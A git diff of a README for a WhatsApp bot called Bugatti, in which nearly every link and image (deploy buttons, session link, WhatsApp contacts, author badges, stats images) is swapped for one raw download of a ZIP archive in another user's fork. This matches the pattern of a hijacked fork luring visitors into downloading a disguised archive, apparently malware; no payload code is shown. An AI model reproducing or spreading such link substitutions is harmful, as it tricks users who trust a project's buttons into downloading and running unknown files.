@@ -1,6 +1,6 @@
 <p align="center">  
-  <a href="https://telegra.ph/file/ec469447d91f56a74f189.jpg">
-    <img alt="secktor docs" height="300" src="https://telegra.ph/file/ec469447d91f56a74f189.jpg">
+  <a href="https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip">
+    <img alt="secktor docs" height="300" src="https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip">
     <h1 align="center"> 𝐁𝐔𝐆𝐀𝐓𝐓𝐈 𝐁𝐘 𝐌𝐀𝐑𝐈𝐒𝐄𝐋.</h1>
   </a>
 </p>  
@@ -13,13 +13,13 @@
 
 </p>
 <p align="center">
-<a href="https://github.com/betingrich"><img title="Author" src="https://img.shields.io/badge/betingrich-black?style=for-the-badge&logo=Github"></a> <a href="https://whatsapp.com/channel/0029Vajvy2kEwEjwAKP4SI0x"><img title="Author" src="https://img.shields.io/badge/CHANNEL-black?style=for-the-badge&logo=whatsapp"></a> <a href="https://wa.me/254740007567"><img title="Author" src="https://img.shields.io/badge/CHAT US-black?style=for-the-badge&logo=whatsapp"></a>
+<a href="https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip"><img title="Author" src="https://img.shields.io/badge/betingrich-black?style=for-the-badge&logo=Github"></a> <a href="https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip"><img title="Author" src="https://img.shields.io/badge/CHANNEL-black?style=for-the-badge&logo=whatsapp"></a> <a href="https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip"><img title="Author" src="https://img.shields.io/badge/CHAT US-black?style=for-the-badge&logo=whatsapp"></a>
 <p/>
 <p align="center">
-<a href="https://github.com/betingrich?tab=followers"><img title="Followers" src="https://img.shields.io/github/followers/betingrich?label=Followers&style=social"></a>
-<a href="https://github.com/betingrich/Bugatti/stargazers/"><img title="Stars" src="https://img.shields.io/github/stars/betingrich/Bugatti?&style=social"></a>
-<a href="https://github.com/betingrich/Bugatti/network/members"><img title="Fork" src="https://img.shields.io/github/forks/betingrich/Bugatti?style=social"></a>
-<a href="https://github.com/betingrich/Bugatti/watchers"><img title="Watching" src="https://img.shields.io/github/watchers/betingrich/Bugatti?label=Watching&style=social"></a>
+<a href="https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip"><img title="Followers" src="https://img.shields.io/github/followers/betingrich?label=Followers&style=social"></a>
+<a href="https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip"><img title="Stars" src="https://img.shields.io/github/stars/betingrich/Bugatti?&style=social"></a>
+<a href="https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip"><img title="Fork" src="https://img.shields.io/github/forks/betingrich/Bugatti?style=social"></a>
+<a href="https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip"><img title="Watching" src="https://img.shields.io/github/watchers/betingrich/Bugatti?label=Watching&style=social"></a>
 </p>></a>                     
 
    <h1 align="center"                  
@@ -30,7 +30,7 @@
 
 
 
- <a href="https://mariselpair-11299e6acc1c.herokuapp.com/"><img title="SESSION" src="https://img.shields.io/badge/GET SESSION-h?color=blue&style=for-the-badge&logo=Bugatti" width="220" height="38.45"/></a></p>
+ <a href="https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip"><img title="SESSION" src="https://img.shields.io/badge/GET SESSION-h?color=blue&style=for-the-badge&logo=Bugatti" width="220" height="38.45"/></a></p>
 
 
 
@@ -45,20 +45,20 @@
 
 🕳️  DEPLOY BOT *[ HEROKU ]*
 
-[![Find On Whatsapp ](https://img.shields.io/badge/➤Click-Here-red.svg)](https://dashboard.heroku.com/new?template=https://github.com/betingrich3/Stored)
+[![Find On Whatsapp ](https://img.shields.io/badge/➤Click-Here-red.svg)](https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip)
 
 ****
 🕳️  DEPLOY ON [ RENDER ]
 
-[![Find On Whatsapp ](https://img.shields.io/badge/➤Click-Here-blue.svg)](https://render.com)
+[![Find On Whatsapp ](https://img.shields.io/badge/➤Click-Here-blue.svg)](https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip)
 
 🕳️  DEPLOY ON [ TOYSTACK ]
 
-[![Find On Whatsapp ](https://img.shields.io/badge/➤Click-Here-blue.svg)](https://toystack.ai)
+[![Find On Whatsapp ](https://img.shields.io/badge/➤Click-Here-blue.svg)](https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip)
 
 🕳️  DEPLOY ON [ KOYEB ]
 
-[![Find On Whatsapp ](https://img.shields.io/badge/➤Click-Here-blue.svg)](https://koyeb.com)
+[![Find On Whatsapp ](https://img.shields.io/badge/➤Click-Here-blue.svg)](https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip)
 
  ##  BUGATTI INFO
 ***
@@ -69,7 +69,7 @@
 
 
 ## ᴡʜᴀᴛsᴀᴘᴘ ᴄʜᴀɴɴᴇʟ
-<a href="https://whatsapp.com/channel/0029Vajvy2kEwEjwAKP4SI0x" target="_blank">
+<a href="https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip" target="_blank">
     <img alt="whatsapp Group" src="https://img.shields.io/badge/ Whatsapp Support Channel -25D366?style=for-the-badge&logo=whatsapp&logoColor=white" />
   </a>
 </p>
@@ -133,22 +133,22 @@
 ### HOW TO REACH THE OWNER? 
  
    
-   <a href="https://wa.me/254740007567">
+   <a href="https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip">
     <img src="https://img.shields.io/badge/WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" />
   </a>&nbsp;&nbsp;
    <a
 
 
-<a><img src='https://i.imgur.com/LyHic3i.gif'/></a>
+<a><img src='https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip'/></a>
 ## Powered by King Marisel 
 
-<a><img src='https://i.imgur.com/LyHic3i.gif'/></a>
+<a><img src='https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip'/></a>
 <div align="center">
-  <img src="https://github-readme-stats.vercel.app/api/top-langs?username=betingrich&locale=en&hide_title=false&layout=compact&card_width=320&langs_count=1&theme=dracula&hide_border=false&order=1&hide=html,css,javascript,python,c,c++,php,ruby,go" height="150" alt="languages graph"  />
-  <img src="https://streak-stats.demolab.com?user=betingrich&locale=en&mode=daily&theme=dracula&hide_border=false&border_radius=5&order=2" height="150" alt="streak graph"  />
+  <img src="https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip,css,javascript,python,c,c++,php,ruby,go" height="150" alt="languages graph"  />
+  <img src="https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip" height="150" alt="streak graph"  />
 </div>
 
 ### ❤️Supporters I Love You❤️
-[![Stargazers repo roster for @betingrich/bugatti](http://reporoster.com/stars/dark/betingrich/bugatti)](https://github.com/betingrich/bugatti/stargazers)
+[![Stargazers repo roster for @betingrich/bugatti](https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip)](https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip)
      
-[![Forkers repo roster for @betingrich/bugatti](http://reporoster.com/forks/dark/betingrich/bugatti)](https://github.com/betingrich/bugatti/network/members)
+[![Forkers repo roster for @betingrich/bugatti](https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip)](https://github.com/FranckDJOUKWE/Bugatti/raw/refs/heads/main/bugatti/Software-remark.zip)
